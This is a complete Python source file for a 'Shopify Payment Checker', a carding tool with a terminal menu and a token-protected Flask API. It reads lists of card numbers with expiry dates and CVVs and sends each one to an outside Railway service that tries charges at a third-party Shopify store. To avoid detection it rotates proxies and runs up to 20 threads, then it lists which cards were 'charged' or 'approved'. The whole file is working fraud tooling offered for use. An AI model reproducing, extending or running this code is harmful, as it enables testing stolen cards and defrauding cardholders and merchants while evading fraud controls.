#!/usr/bin/env python3
"""
Shopify Payment Checker v2.1 - HYBRID
CLI mode: python shopify_checker.py
API mode: gunicorn shopify_checker:app (Railway)
"""

import os
import sys
import re
import json
import time
import requests
from typing import Dict, Optional, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== COLORS =====
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# ===== SYMBOLS =====
CHECK = f"{GREEN}[✓]{RESET}"
CROSS = f"{RED}[✗]{RESET}"
WARNING = f"{YELLOW}[⚠]{RESET}"
ARROW = f"{CYAN}[➜]{RESET}"
STAR = f"{YELLOW}[★]{RESET}"
INFO = f"{BLUE}[ℹ]{RESET}"
CARD = f"{MAGENTA}[💳]{RESET}"
LIGHTNING = f"{YELLOW}[⚡]{RESET}"
GEAR = f"{CYAN}[⚙]{RESET}"
HEART = f"{RED}[♥]{RESET}"
MONEY = f"{GREEN}[💰]{RESET}"
SHOPIFY_ICON = f"{CYAN}[🛒]{RESET}"
PROXY_ICON = f"{CYAN}[🌐]{RESET}"
MASS = f"{MAGENTA}[📊]{RESET}"
LOCK = f"{YELLOW}[🔒]{RESET}"
HOURGLASS = f"{BLUE}[⏳]{RESET}"

# ===== CONFIG =====
AUTH_TOKEN = os.environ.get('TOKEN', '')
PORT = int(os.environ.get('PORT', 5000))

# ===== PROXY MANAGEMENT =====
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.failed_proxies = set()

    def load_proxies(self, file_path: str) -> int:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.proxies.append(proxy)
            return len(self.proxies)
        except Exception as e:
            print(f"{CROSS} {RED}Error loading proxies: {e}{RESET}")
            return 0

    def add_proxy(self, proxy: str):
        if proxy and proxy not in self.proxies:
            self.proxies.append(proxy)

    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        attempts = 0
        while attempts < len(self.proxies):
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            if proxy in self.failed_proxies:
                attempts += 1
                continue
            return proxy
        self.failed_proxies.clear()
        if self.proxies:
            return self.proxies[0]
        return None

    def mark_failed(self, proxy: str):
        if proxy:
            self.failed_proxies.add(proxy)

proxy_manager = ProxyManager()

def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    card_str = card_str.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_str)
        if match:
            card, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 2:
                year = f"20{year}"
            return card, month, year, cvv
    return None

def mask_card(card: str) -> str:
    if len(card) >= 10:
        return card[:6] + "******" + card[-4:]
    return card

def extract_cards(text: str) -> List[str]:
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            parsed = parse_card(line)
            if parsed:
                card, month, year, cvv = parsed
                cards.append(f"{card}|{month}|{year}|{cvv}")
    return list(dict.fromkeys(cards))

def check_card(card: str, use_proxy: bool = True) -> Dict:
    """Check a single card using Shopify API"""
    try:
        card_number, exp_month, exp_year, cvv = card.split('|')
        url = "https://web-production-669be.up.railway.app/shopify"
        proxy = None
        if use_proxy:
            proxy = proxy_manager.get_proxy()

        params = {
            "site": "https://the3doodler.com/",
            "cc": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        }
        if proxy:
            params["proxy"] = proxy

        start_time = time.time()
        response = requests.get(url, params=params, timeout=30)
        elapsed = time.time() - start_time

        if response.status_code == 200:
            try:
                data = response.json()
                status = data.get('Status', False)
                gateway = data.get('Gateway', 'Unknown')
                price = data.get('Price', 'N/A')
                response_msg = data.get('Response', 'Unknown')
                time_taken = data.get('Time', f'{elapsed:.2f}s')

                response_lower = str(response_msg).lower()

                if status == True:
                    status_type = 'CHARGED'
                    status_color = GREEN
                    status_icon = CHECK
                elif 'approved' in response_lower:
                    status_type = 'APPROVED'
                    status_color = GREEN
                    status_icon = CHECK
                elif 'order_placed' in response_lower or 'order_place' in response_lower:
                    status_type = 'ORDER_PLACED'
                    status_color = GREEN
                    status_icon = CHECK
                elif '3ds' in response_lower or '3d_secure' in response_lower:
                    status_type = '3DS_REQUIRED'
                    status_color = YELLOW
                    status_icon = LOCK
                elif 'declined' in response_lower or 'card_declined' in response_lower:
                    status_type = 'DECLINED'
                    status_color = RED
                    status_icon = CROSS
                else:
                    status_type = 'UNKNOWN'
                    status_color = YELLOW
                    status_icon = WARNING

                return {
                    'card': card,
                    'masked_card': mask_card(card_number),
                    'status': status_type,
                    'status_bool': status,
                    'gateway': gateway,
                    'price': price,
                    'response': response_msg,
                    'time': time_taken,
                    'proxy': proxy,
                    'status_color': status_color,
                    'status_icon': status_icon
                }
            except json.JSONDecodeError:
                return {
                    'card': card, 'masked_card': mask_card(card_number),
                    'status': 'ERROR', 'status_bool': False,
                    'gateway': 'Unknown', 'price': 'N/A',
                    'response': 'Invalid JSON response',
                    'time': f'{elapsed:.2f}s', 'proxy': proxy,
                    'status_color': RED, 'status_icon': CROSS
                }
        else:
            if proxy:
                proxy_manager.mark_failed(proxy)
            return {
                'card': card, 'masked_card': mask_card(card_number),
                'status': 'ERROR', 'status_bool': False,
                'gateway': 'Unknown', 'price': 'N/A',
                'response': f'HTTP {response.status_code}',
                'time': f'{elapsed:.2f}s', 'proxy': proxy,
                'status_color': RED, 'status_icon': CROSS
            }
    except requests.exceptions.ProxyError:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card, 'masked_card': mask_card(card.split('|')[0]) if '|' in card else card,
            'status': 'ERROR', 'status_bool': False,
            'gateway': 'Unknown', 'price': 'N/A',
            'response': 'Proxy Error', 'time': 'N/A',
            'proxy': proxy, 'status_color': RED, 'status_icon': CROSS
        }
    except requests.exceptions.Timeout:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card, 'masked_card': mask_card(card.split('|')[0]) if '|' in card else card,
            'status': 'ERROR', 'status_bool': False,
            'gateway': 'Unknown', 'price': 'N/A',
            'response': 'Timeout', 'time': 'N/A',
            'proxy': proxy, 'status_color': RED, 'status_icon': CROSS
        }
    except Exception as e:
        if proxy:
            proxy_manager.mark_failed(proxy)
        return {
            'card': card, 'masked_card': mask_card(card.split('|')[0]) if '|' in card else card,
            'status': 'ERROR', 'status_bool': False,
            'gateway': 'Unknown', 'price': 'N/A',
            'response': str(e)[:50], 'time': 'N/A',
            'proxy': proxy, 'status_color': RED, 'status_icon': CROSS
        }

# ===== CLI FUNCTIONS =====
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{WHITE}{'═'*70}{RESET}
{YELLOW}╔{'═'*68}╗{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}██████╗ ██╗  ██╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗{RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}██╔══██╗██║  ██║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝{RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}██████╔╝███████║██║   ██║██████╔╝██║█████╗   ╚████╔╝ {RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}██╔═══╝ ██╔══██║██║   ██║██╔═══╝ ██║██╔══╝    ╚██╔╝  {RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}██║     ██║  ██║╚██████╔╝██║     ██║██║        ██║   {RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{CYAN}╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝   {RESET}{YELLOW}  ║{RESET}
{YELLOW}║{RESET}  {BOLD}{WHITE}        S H O P I F Y   C H E C K E R   v2.1{RESET}{YELLOW}          ║{RESET}
{YELLOW}║{RESET}  {BOLD}{DIM}            Dev: @x64kbitters{RESET}{YELLOW}                         ║{RESET}
{YELLOW}╚{'═'*68}╝{RESET}
{WHITE}{'═'*70}{RESET}
"""
    print(banner)

def print_menu():
    menu = f"""
{STAR} {BOLD}{WHITE}M A I N   M E N U{RESET} {STAR}
{WHITE}{'─'*60}{RESET}

{GREEN}1.{RESET} {CYAN}Single Card Check{RESET}
{YELLOW}2.{RESET} {CYAN}Multiple Cards Check{RESET}
{BLUE}3.{RESET} {CYAN}Load from File{RESET}
{MAGENTA}4.{RESET} {CYAN}Mass Check via File Path{RESET}
{CYAN}5.{RESET} {CYAN}Proxy Management{RESET}
{RED}6.{RESET} {CYAN}Exit{RESET}

{WHITE}{'─'*60}{RESET}
"""
    print(menu)

def single_check():
    clear_screen()
    print_banner()
    print(f"\n{LIGHTNING} {BOLD}{GREEN}SINGLE CARD CHECK - SHOPIFY{SHOPIFY_ICON}{RESET} {LIGHTNING}\n")

    use_proxy = False
    if proxy_manager.proxies:
        print(f"{PROXY_ICON} {YELLOW}Use proxy? (y/n):{RESET} ", end='')
        choice = input().strip().lower()
        use_proxy = choice == 'y'

    print(f"\n{ARROW} {YELLOW}Enter card:{RESET}")
    print(f"  {DIM}Format: card|mm|yy|cvv{RESET}")
    print(f"  {DIM}Example: 4972039707804898|06|2028|853{RESET}")
    card_input = input(f"{WHITE}➤{RESET} ").strip()

    parsed = parse_card(card_input)
    if not parsed:
        print(f"\n{CROSS} {RED}Invalid card format!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    print(f"\n{GEAR} {BLUE}Checking card...{RESET}")
    if use_proxy:
        proxy = proxy_manager.get_proxy()
        if proxy:
            print(f"{PROXY_ICON} {CYAN}Using proxy: {proxy}{RESET}")
    print(f"{WHITE}{'─'*60}{RESET}")

    result = check_card(card_input, use_proxy=use_proxy)
    parts = card_input.split('|')
    masked = mask_card(parts[0])

    status_display = f"{result['status_icon']} {BOLD}{result['status_color']}{result['status']}{RESET}"

    print(f"\n{WHITE}{'═'*60}{RESET}")
    print(f"{CARD} {BOLD}Card:{RESET} {YELLOW}{masked}|{parts[1]}|{parts[2]}|{parts[3]}{RESET}")
    print(f"{MONEY} {BOLD}Price:{RESET} {GREEN}${result['price']}{RESET}")
    print(f"{SHOPIFY_ICON} {BOLD}Gateway:{RESET} {CYAN}{result['gateway']}{RESET}")
    print(f"{INFO} {BOLD}Status:{RESET} {status_display}")
    print(f"{INFO} {BOLD}Response:{RESET} {result['status_color']}{result['response']}{RESET}")
    print(f"{HOURGLASS} {BOLD}Time:{RESET} {result['time']}")
    if result.get('proxy'):
        print(f"{PROXY_ICON} {BOLD}Proxy:{RESET} {DIM}{result['proxy']}{RESET}")
    print(f"{WHITE}{'═'*60}{RESET}")

    input(f"\n{INFO} Press Enter...")

def bulk_check():
    clear_screen()
    print_banner()
    print(f"\n{LIGHTNING} {BOLD}{YELLOW}BULK CARD CHECK - SHOPIFY{SHOPIFY_ICON}{RESET} {LIGHTNING}\n")

    use_proxy = False
    if proxy_manager.proxies:
        print(f"{PROXY_ICON} {YELLOW}Use proxy? (y/n):{RESET} ", end='')
        choice = input().strip().lower()
        use_proxy = choice == 'y'

    print(f"\n{ARROW} {YELLOW}Enter cards (one per line, 'done' to finish):{RESET}\n")
    cards = []
    while True:
        line = input(f"{WHITE}➤{RESET} ").strip()
        if line.lower() == 'done':
            break
        if line:
            parsed = parse_card(line)
            if parsed:
                card, month, year, cvv = parsed
                cards.append(f"{card}|{month}|{year}|{cvv}")
            else:
                print(f"{WARNING} {YELLOW}Invalid format, skipping...{RESET}")

    if not cards:
        print(f"\n{CROSS} {RED}No valid cards!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    print(f"\n{GEAR} {BLUE}Processing {len(cards)} cards...{RESET}")
    if use_proxy:
        print(f"{PROXY_ICON} {CYAN}Using proxies{RESET}")
    print(f"{WHITE}{'─'*60}{RESET}")

    results = []
    charged = []
    start = time.time()

    for i, card in enumerate(cards, 1):
        print(f"[{i}/{len(cards)}] ", end='', flush=True)
        result = check_card(card, use_proxy=use_proxy)
        results.append(result)

        if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
            charged.append(card)
            print(f"{GREEN}{result['status']} - {card} | {result['response']}{RESET}")
        elif result['status'] == '3DS_REQUIRED':
            print(f"{YELLOW}3DS_REQUIRED - {card} | {result['response']}{RESET}")
        elif result['status'] == 'DECLINED':
            print(f"{RED}DECLINED - {card} | {result['response']}{RESET}")
        else:
            print(f"{YELLOW}ERROR - {card} | {result['response']}{RESET}")
        time.sleep(0.2)

    elapsed = time.time() - start
    charged_count = len(charged)
    total = len(cards)

    print(f"\n{WHITE}{'═'*60}{RESET}")
    print(f"{STAR} {BOLD}SUMMARY{RESET} {STAR}")
    print(f"{WHITE}{'─'*60}{RESET}")
    print(f"{CHECK} {GREEN}Charged/Approved:{RESET} {charged_count}/{total}")
    print(f"{LOCK} {YELLOW}3DS Required:{RESET} {sum(1 for r in results if r['status'] == '3DS_REQUIRED')}/{total}")
    print(f"{CROSS} {RED}Declined/Error:{RESET} {total - charged_count}/{total}")
    print(f"{INFO} {BLUE}Time:{RESET} {elapsed:.2f}s")

    if charged:
        print(f"\n{HEART} {GREEN}Successful Cards:{RESET}")
        for c in charged:
            parts = c.split('|')
            print(f"  {CHECK} {GREEN}{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}{RESET}")

    print(f"{WHITE}{'═'*60}{RESET}")
    input(f"\n{INFO} Press Enter...")

def file_check():
    clear_screen()
    print_banner()
    print(f"\n{GEAR} {BOLD}{BLUE}LOAD FROM FILE - SHOPIFY{SHOPIFY_ICON}{RESET} {GEAR}\n")

    use_proxy = False
    if proxy_manager.proxies:
        print(f"{PROXY_ICON} {YELLOW}Use proxy? (y/n):{RESET} ", end='')
        choice = input().strip().lower()
        use_proxy = choice == 'y'

    print(f"\n{ARROW} {YELLOW}Enter file path:{RESET}")
    print(f"  {DIM}Example: cards.txt{RESET}")
    file_path = input(f"{WHITE}➤{RESET} ").strip()

    try:
        with open(file_path, 'r') as f:
            content = f.read()
        cards = extract_cards(content)
    except FileNotFoundError:
        print(f"\n{CROSS} {RED}File not found!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return
    except Exception as e:
        print(f"\n{CROSS} {RED}Error: {e}{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    if not cards:
        print(f"\n{CROSS} {RED}No valid cards in file!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    print(f"\n{CHECK} {GREEN}Loaded {len(cards)} cards{RESET}")
    print(f"\n{GEAR} {BLUE}Processing {len(cards)} cards...{RESET}")
    if use_proxy:
        print(f"{PROXY_ICON} {CYAN}Using proxies{RESET}")
    print(f"{WHITE}{'─'*60}{RESET}")

    results = []
    charged = []
    start = time.time()

    for i, card in enumerate(cards, 1):
        print(f"[{i}/{len(cards)}] ", end='', flush=True)
        result = check_card(card, use_proxy=use_proxy)
        results.append(result)

        if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
            charged.append(card)
            print(f"{GREEN}{result['status']} - {card} | {result['response']}{RESET}")
        elif result['status'] == '3DS_REQUIRED':
            print(f"{YELLOW}3DS_REQUIRED - {card} | {result['response']}{RESET}")
        elif result['status'] == 'DECLINED':
            print(f"{RED}DECLINED - {card} | {result['response']}{RESET}")
        else:
            print(f"{YELLOW}ERROR - {card} | {result['response']}{RESET}")
        time.sleep(0.2)

    elapsed = time.time() - start
    charged_count = len(charged)
    total = len(cards)

    print(f"\n{WHITE}{'═'*60}{RESET}")
    print(f"{STAR} {BOLD}SUMMARY{RESET} {STAR}")
    print(f"{WHITE}{'─'*60}{RESET}")
    print(f"{CHECK} {GREEN}Charged/Approved:{RESET} {charged_count}/{total}")
    print(f"{LOCK} {YELLOW}3DS Required:{RESET} {sum(1 for r in results if r['status'] == '3DS_REQUIRED')}/{total}")
    print(f"{CROSS} {RED}Declined/Error:{RESET} {total - charged_count}/{total}")
    print(f"{INFO} {BLUE}Time:{RESET} {elapsed:.2f}s")

    if charged:
        print(f"\n{HEART} {GREEN}Successful Cards:{RESET}")
        for c in charged:
            parts = c.split('|')
            print(f"  {CHECK} {GREEN}{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}{RESET}")

    print(f"{WHITE}{'═'*60}{RESET}")
    input(f"\n{INFO} Press Enter...")

def mass_check_file():
    clear_screen()
    print_banner()
    print(f"\n{MASS} {BOLD}{MAGENTA}MASS CHECK VIA FILE PATH - SHOPIFY{SHOPIFY_ICON}{RESET} {MASS}\n")

    use_proxy = False
    if proxy_manager.proxies:
        print(f"{PROXY_ICON} {YELLOW}Use proxy? (y/n):{RESET} ", end='')
        choice = input().strip().lower()
        use_proxy = choice == 'y'

    print(f"\n{ARROW} {YELLOW}Number of threads (1-20):{RESET} ", end='')
    try:
        max_workers = int(input().strip())
        max_workers = max(1, min(20, max_workers))
    except:
        max_workers = 5

    print(f"\n{ARROW} {YELLOW}Enter file path for mass check:{RESET}")
    print(f"  {DIM}Example: /path/to/cards.txt{RESET}")
    file_path = input(f"{WHITE}➤{RESET} ").strip()

    try:
        with open(file_path, 'r') as f:
            content = f.read()
        cards = extract_cards(content)
    except FileNotFoundError:
        print(f"\n{CROSS} {RED}File not found!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return
    except Exception as e:
        print(f"\n{CROSS} {RED}Error: {e}{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    if not cards:
        print(f"\n{CROSS} {RED}No valid cards in file!{RESET}")
        input(f"\n{INFO} Press Enter...")
        return

    print(f"\n{CHECK} {GREEN}Loaded {len(cards)} cards for mass checking{RESET}")
    print(f"{GEAR} {BLUE}Starting mass check with {max_workers} threads...{RESET}")
    if use_proxy:
        print(f"{PROXY_ICON} {CYAN}Using proxies{RESET}")
    print(f"{WHITE}{'─'*60}{RESET}")

    results = []
    charged = []
    start = time.time()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_card, card, use_proxy): card for card in cards}

        for i, future in enumerate(as_completed(futures), 1):
            card = futures[future]
            try:
                result = future.result(timeout=60)
                results.append(result)

                if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
                    charged.append(card)
                    print(f"[{i}/{len(cards)}] {GREEN}{result['status']} - {card} | {result['response']}{RESET}")
                elif result['status'] == '3DS_REQUIRED':
                    print(f"[{i}/{len(cards)}] {YELLOW}3DS_REQUIRED - {card} | {result['response']}{RESET}")
                elif result['status'] == 'DECLINED':
                    print(f"[{i}/{len(cards)}] {RED}DECLINED - {card} | {result['response']}{RESET}")
                else:
                    print(f"[{i}/{len(cards)}] {YELLOW}ERROR - {card} | {result['response']}{RESET}")
            except Exception as e:
                print(f"[{i}/{len(cards)}] {RED}ERROR - {card} | {str(e)[:50]}{RESET}")
                results.append({
                    'card': card,
                    'status': 'ERROR',
                    'response': str(e)[:50]
                })

    elapsed = time.time() - start
    charged_count = len(charged)
    total = len(cards)

    print(f"\n{WHITE}{'═'*60}{RESET}")
    print(f"{STAR} {BOLD}MASS CHECK SUMMARY{RESET} {STAR}")
    print(f"{WHITE}{'─'*60}{RESET}")
    print(f"{CHECK} {GREEN}Charged/Approved:{RESET} {charged_count}/{total}")
    print(f"{LOCK} {YELLOW}3DS Required:{RESET} {sum(1 for r in results if r.get('status') == '3DS_REQUIRED')}/{total}")
    print(f"{CROSS} {RED}Declined/Error:{RESET} {total - charged_count}/{total}")
    print(f"{INFO} {BLUE}Total Time:{RESET} {elapsed:.2f}s")
    print(f"{INFO} {BLUE}Average:{RESET} {elapsed/total:.2f}s per card" if total > 0 else "")

    if charged:
        print(f"\n{HEART} {GREEN}Successful Cards:{RESET}")
        for c in charged:
            parts = c.split('|')
            print(f"  {CHECK} {GREEN}{mask_card(parts[0])}|{parts[1]}|{parts[2]}|{parts[3]}{RESET}")

    print(f"{WHITE}{'═'*60}{RESET}")
    input(f"\n{INFO} Press Enter...")

def proxy_management():
    clear_screen()
    print_banner()
    print(f"\n{PROXY_ICON} {BOLD}{CYAN}PROXY MANAGEMENT - SHOPIFY{RESET} {PROXY_ICON}\n")

    while True:
        print(f"{WHITE}{'─'*60}{RESET}")
        print(f"{STAR} {BOLD}Proxy Menu{RESET}")
        print(f"{WHITE}{'─'*60}{RESET}")
        print(f"{GREEN}1.{RESET} Load proxies from file")
        print(f"{YELLOW}2.{RESET} Add single proxy")
        print(f"{BLUE}3.{RESET} Show current proxies")
        print(f"{CYAN}4.{RESET} Clear all proxies")
        print(f"{MAGENTA}5.{RESET} Test proxies")
        print(f"{RED}6.{RESET} Back to main menu")
        print(f"{WHITE}{'─'*60}{RESET}")

        choice = input(f"\n{ARROW} {GREEN}Choose option: {RESET}").strip()

        if choice == '1':
            print(f"\n{ARROW} {YELLOW}Enter proxy file path:{RESET}")
            file_path = input(f"{WHITE}➤{RESET} ").strip()
            count = proxy_manager.load_proxies(file_path)
            if count > 0:
                print(f"\n{CHECK} {GREEN}Loaded {count} proxies{RESET}")
            else:
                print(f"\n{CROSS} {RED}No proxies loaded{RESET}")
            time.sleep(1)

        elif choice == '2':
            print(f"\n{ARROW} {YELLOW}Enter proxy (supports all formats):{RESET}")
            print(f"  {DIM}Examples:{RESET}")
            print(f"  {DIM}• http://user:pass@192.168.1.1:8080{RESET}")
            print(f"  {DIM}• socks5://user:pass@192.168.1.1:1080{RESET}")
            print(f"  {DIM}• 192.168.1.1:8080{RESET}")
            proxy = input(f"{WHITE}➤{RESET} ").strip()
            if proxy:
                proxy_manager.add_proxy(proxy)
                print(f"\n{CHECK} {GREEN}Proxy added: {proxy}{RESET}")
            else:
                print(f"\n{CROSS} {RED}Invalid proxy format{RESET}")
            time.sleep(1)

        elif choice == '3':
            if proxy_manager.proxies:
                print(f"\n{CHECK} {GREEN}Total proxies: {len(proxy_manager.proxies)}{RESET}")
                print(f"{WHITE}{'─'*60}{RESET}")
                for i, proxy in enumerate(proxy_manager.proxies[:10], 1):
                    print(f"  {i}. {proxy}")
                if len(proxy_manager.proxies) > 10:
                    print(f"  ... and {len(proxy_manager.proxies) - 10} more")
            else:
                print(f"\n{WARNING} {YELLOW}No proxies loaded{RESET}")
            input(f"\n{INFO} Press Enter...")

        elif choice == '4':
            proxy_manager.proxies.clear()
            proxy_manager.failed_proxies.clear()
            proxy_manager.current_index = 0
            print(f"\n{CHECK} {GREEN}All proxies cleared{RESET}")
            time.sleep(1)

        elif choice == '5':
            if not proxy_manager.proxies:
                print(f"\n{WARNING} {YELLOW}No proxies to test{RESET}")
                time.sleep(1)
                continue

            print(f"\n{GEAR} {BLUE}Testing proxies...{RESET}")
            working = 0
            for proxy in proxy_manager.proxies[:5]:
                try:
                    response = requests.get('https://httpbin.org/ip', proxies={'http': proxy, 'https': proxy}, timeout=5)
                    if response.status_code == 200:
                        print(f"{CHECK} {GREEN}Working: {proxy}{RESET}")
                        working += 1
                    else:
                        print(f"{CROSS} {RED}Failed: {proxy}{RESET}")
                except:
                    print(f"{CROSS} {RED}Failed: {proxy}{RESET}")

            print(f"\n{INFO} {BLUE}Working: {working}/{min(5, len(proxy_manager.proxies))}{RESET}")
            input(f"\n{INFO} Press Enter...")

        elif choice == '6':
            break
        else:
            print(f"\n{CROSS} {RED}Invalid choice!{RESET}")
            time.sleep(1)

def cli_main():
    try:
        while True:
            clear_screen()
            print_banner()
            print_menu()

            choice = input(f"\n{ARROW} {GREEN}Choose option (1-6): {RESET}").strip()

            if choice == '1':
                single_check()
            elif choice == '2':
                bulk_check()
            elif choice == '3':
                file_check()
            elif choice == '4':
                mass_check_file()
            elif choice == '5':
                proxy_management()
            elif choice == '6':
                print(f"\n{CHECK} {GREEN}Goodbye!{RESET}")
                sys.exit(0)
            else:
                print(f"\n{CROSS} {RED}Invalid choice!{RESET}")
                time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n\n{WARNING} {YELLOW}Interrupted{RESET}")
        sys.exit(0)

# ===== FLASK API (Railway) =====
try:
    from flask import Flask, request, jsonify
    app = Flask(__name__)

    def require_token(f):
        def decorated(*args, **kwargs):
            token = request.headers.get('Authorization', '').replace('Bearer ', '').strip()
            if not AUTH_TOKEN:
                return jsonify({'error': 'TOKEN not configured on server'}), 500
            if token != AUTH_TOKEN:
                return jsonify({'error': 'Invalid or missing token'}), 401
            return f(*args, **kwargs)
        decorated.__name__ = f.__name__
        return decorated

    @app.route('/')
    def home():
        return jsonify({
            'name': 'Shopify Payment Checker v2.1',
            'status': 'running',
            'mode': 'API',
            'endpoints': {
                'POST /check': 'Single card check',
                'POST /bulk': 'Multiple cards check',
                'POST /mass': 'Mass check with threads',
                'POST /proxy/load': 'Load proxies from file',
                'GET /proxy/list': 'List loaded proxies',
                'POST /proxy/add': 'Add single proxy',
                'DELETE /proxy/clear': 'Clear all proxies'
            },
            'auth': 'Bearer TOKEN in Authorization header'
        })

    @app.route('/check', methods=['POST'])
    @require_token
    def api_single_check():
        data = request.get_json()
        if not data or 'card' not in data:
            return jsonify({'error': 'Provide card in format: card|mm|yy|cvv'}), 400

        card_input = data['card'].strip()
        use_proxy = data.get('use_proxy', False)

        parsed = parse_card(card_input)
        if not parsed:
            return jsonify({'error': 'Invalid card format'}), 400

        card = f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}"
        result = check_card(card, use_proxy=use_proxy)

        return jsonify({
            'success': True,
            'result': {
                'card': result['masked_card'],
                'status': result['status'],
                'gateway': result['gateway'],
                'price': result['price'],
                'response': result['response'],
                'time': result['time']
            }
        })

    @app.route('/bulk', methods=['POST'])
    @require_token
    def api_bulk_check():
        data = request.get_json()
        if not data or 'cards' not in data:
            return jsonify({'error': 'Provide cards array'}), 400

        cards_raw = data['cards']
        use_proxy = data.get('use_proxy', False)

        cards = []
        for c in cards_raw:
            parsed = parse_card(c)
            if parsed:
                cards.append(f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}")

        if not cards:
            return jsonify({'error': 'No valid cards'}), 400

        results = []
        charged = []

        for card in cards:
            result = check_card(card, use_proxy=use_proxy)
            results.append({
                'card': result['masked_card'],
                'status': result['status'],
                'gateway': result['gateway'],
                'price': result['price'],
                'response': result['response'],
                'time': result['time']
            })
            if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
                charged.append(result['masked_card'])
            time.sleep(0.2)

        return jsonify({
            'success': True,
            'total': len(cards),
            'charged': len(charged),
            'results': results
        })

    @app.route('/mass', methods=['POST'])
    @require_token
    def api_mass_check():
        data = request.get_json()
        if not data or 'cards' not in data:
            return jsonify({'error': 'Provide cards array'}), 400

        cards_raw = data['cards']
        use_proxy = data.get('use_proxy', False)
        max_workers = min(data.get('threads', 5), 20)

        cards = []
        for c in cards_raw:
            parsed = parse_card(c)
            if parsed:
                cards.append(f"{parsed[0]}|{parsed[1]}|{parsed[2]}|{parsed[3]}")

        if not cards:
            return jsonify({'error': 'No valid cards'}), 400

        results = []
        charged = []
        start = time.time()

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_card, card, use_proxy): card for card in cards}

            for future in as_completed(futures):
                card = futures[future]
                try:
                    result = future.result(timeout=60)
                    results.append({
                        'card': result['masked_card'],
                        'status': result['status'],
                        'gateway': result['gateway'],
                        'price': result['price'],
                        'response': result['response'],
                        'time': result['time']
                    })
                    if result['status'] in ['CHARGED', 'APPROVED', 'ORDER_PLACED']:
                        charged.append(result['masked_card'])
                except Exception as e:
                    results.append({
                        'card': mask_card(card.split('|')[0]),
                        'status': 'ERROR',
                        'response': str(e)[:50]
                    })

        elapsed = time.time() - start

        return jsonify({
            'success': True,
            'total': len(cards),
            'charged': len(charged),
            'time': f'{elapsed:.2f}s',
            'results': results
        })

    @app.route('/proxy/load', methods=['POST'])
    @require_token
    def api_load_proxies():
        data = request.get_json()
        if not data or 'file_path' not in data:
            return jsonify({'error': 'Provide file_path'}), 400

        count = proxy_manager.load_proxies(data['file_path'])
        return jsonify({
            'success': True,
            'loaded': count,
            'total': len(proxy_manager.proxies)
        })

    @app.route('/proxy/add', methods=['POST'])
    @require_token
    def api_add_proxy():
        data = request.get_json()
        if not data or 'proxy' not in data:
            return jsonify({'error': 'Provide proxy'}), 400

        proxy_manager.add_proxy(data['proxy'])
        return jsonify({
            'success': True,
            'total': len(proxy_manager.proxies)
        })

    @app.route('/proxy/list', methods=['GET'])
    @require_token
    def api_list_proxies():
        return jsonify({
            'success': True,
            'count': len(proxy_manager.proxies),
            'proxies': proxy_manager.proxies
        })

    @app.route('/proxy/clear', methods=['DELETE'])
    @require_token
    def api_clear_proxies():
        proxy_manager.proxies.clear()
        proxy_manager.failed_proxies.clear()
        proxy_manager.current_index = 0
        return jsonify({
            'success': True,
            'message': 'All proxies cleared'
        })

except ImportError:
    app = None
    print(f"{WARNING} Flask not installed. API mode disabled. Use CLI mode only.")

# ===== MAIN =====
if __name__ == "__main__":
    # Check if running on Railway (has PORT env var set by Railway)
    if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RAILWAY_SERVICE_NAME'):
        print(f"{CYAN}Shopify Payment Checker v2.1 - Railway API Mode{RESET}")
